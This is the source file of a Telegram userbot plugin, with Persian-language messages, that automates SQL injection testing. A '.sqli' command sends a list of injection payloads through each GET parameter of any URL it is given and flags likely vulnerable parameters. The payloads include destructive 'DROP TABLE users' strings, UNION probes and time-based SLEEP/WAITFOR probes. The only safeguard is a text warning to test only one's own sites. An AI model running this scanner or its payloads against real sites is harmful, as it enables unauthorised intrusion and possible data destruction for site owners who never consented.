# plugins/sqlinjection.py

from telethon import events
from client import client
import aiohttp
import urllib.parse
import re
import asyncio

@client.on(events.NewMessage(pattern=r"\.sqli(?:\s+(.+))?", outgoing=True))
async def sql_injection_tester(event):
    url_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()

    if not url_input and reply:
        url_input = reply.message.strip()

    if not url_input:
        await event.reply("""
🔍 **SQL Injection Tester**
━━━━━━━━━━━━━━━━━━
**استفاده:**
`.sqli https://example.com/page.php?id=1`
`.sqli http://target.com/search?q=test`

**قابلیت‌ها:**
• تست خودکار payloadهای SQL injection
• شناسایی نقاط آسیب‌پذیر
• گزارش تفصیلی نتایج
• پشتیبانی از GET parameters

⚠️ **هشدار:** فقط برای تست سایت‌های خودتان استفاده کنید!
        """.strip())
        return

    await event.edit("🔍 در حال تست SQL Injection...")

    try:
        # بررسی URL
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'https://' + url_input

        # استخراج پارامترها
        parsed_url = urllib.parse.urlparse(url_input)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            await event.edit("❌ URL باید حاوی پارامتر باشد (مثل ?id=1)")
            return

        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # payloadهای SQL injection
        payloads = [
            "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\", "\\\\",
            "1'", "1''", "1`", "1``", "1,", '1"', '1""', "1/", "1//", "1\\", "1\\\\",
            "'OR'1", "'OR'1'='1", "'OR'1'='1'--", "'OR'1'='1'/*", "'OR'1'='1'#",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR '1'='1--", "') OR ('1'='1--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT 1--", "1' UNION SELECT 1,2--", "1' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--", "'; DROP TABLE users--",
            "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '00:00:05'--"
        ]

        vulnerable_params = []
        total_tests = 0
        
        await event.edit(f"🔍 تست {len(payloads)} payload در {len(params)} پارامتر...")

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
            # دریافت response اصلی
            try:
                async with session.get(url_input) as resp:
                    original_content = await resp.text()
                    original_status = resp.status
            except:
                await event.edit("❌ نمی‌توان به URL متصل شد!")
                return

            # تست هر پارامتر
            for param_name, param_values in params.items():
                original_value = param_values[0]
                
                for payload in payloads[:20]:  # محدود به 20 payload
                    total_tests += 1
                    
                    # ساخت URL جدید با payload
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    test_url = f"{base_url}?{query_string}"
                    
                    try:
                        async with session.get(test_url) as resp:
                            content = await resp.text()
                            
                            # بررسی نشانه‌های SQL injection
                            sql_errors = [
                                "sql syntax", "mysql_fetch", "ora-", "microsoft odbc",
                                "sqlite_", "postgresql", "warning: mysql", "valid mysql result",
                                "mysqlclient", "microsoft jet database", "odbc drivers error",
                                "invalid query", "sql command not properly ended",
                                "quoted string not properly terminated"
                            ]
                            
                            error_found = any(error in content.lower() for error in sql_errors)
                            status_changed = resp.status != original_status
                            content_changed = len(content) != len(original_content)
                            
                            if error_found or status_changed or (content_changed and abs(len(content) - len(original_content)) > 100):
                                vulnerable_params.append({
                                    'param': param_name,
                                    'payload': payload,
                                    'status': resp.status,
                                    'error': error_found,
                                    'content_diff': len(content) - len(original_content)
                                })
                    
                    except:
                        continue
                    
                    # محدودیت تعداد درخواست‌ها
                    if total_tests >= 50:
                        break
                
                if total_tests >= 50:
                    break

        # ساخت گزارش
        if vulnerable_params:
            vuln_info = []
            for vuln in vulnerable_params[:10]:  # نمایش حداکثر 10 مورد
                status_icon = "🔴" if vuln['status'] >= 400 else "🟡"
                error_icon = "⚠️" if vuln['error'] else ""
                vuln_info.append(f"  {status_icon} {vuln['param']}: `{vuln['payload']}` {error_icon}")
            
            vuln_text = "\n".join(vuln_info)
            risk_level = "🔴 بالا" if len(vulnerable_params) > 5 else "🟡 متوسط"
        else:
            vuln_text = "  ✅ هیچ آسیب‌پذیری یافت نشد"
            risk_level = "🟢 پایین"

        msg = f"""
🔍 **نتایج SQL Injection Test**
━━━━━━━━━━━━━━━━━━
🎯 **URL:** {parsed_url.netloc}
📊 **تست شده:** {total_tests} payload
🔍 **پارامترها:** {len(params)}
⚠️ **آسیب‌پذیری:** {len(vulnerable_params)} مورد
🚨 **سطح خطر:** {risk_level}

**نتایج:**
{vuln_text}

⚠️ **توجه:** این ابزار فقط برای تست امنیت سایت‌های خودتان است!
━━━━━━━━━━━━━━━━━━
        """.strip()

        await event.edit(msg)

    except Exception as e:
        await event.edit(f"⚠️ خطا در تست: {e}")
